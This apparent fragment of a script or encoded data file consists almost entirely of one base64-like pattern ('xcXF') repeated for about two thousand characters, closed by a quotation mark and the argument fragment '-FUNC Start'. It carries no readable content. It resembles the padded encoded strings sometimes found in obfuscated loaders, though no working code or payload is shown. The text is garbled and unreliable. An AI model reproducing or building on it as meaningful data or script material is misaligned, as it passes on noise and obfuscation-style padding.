xcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcX"  -FUNC Start
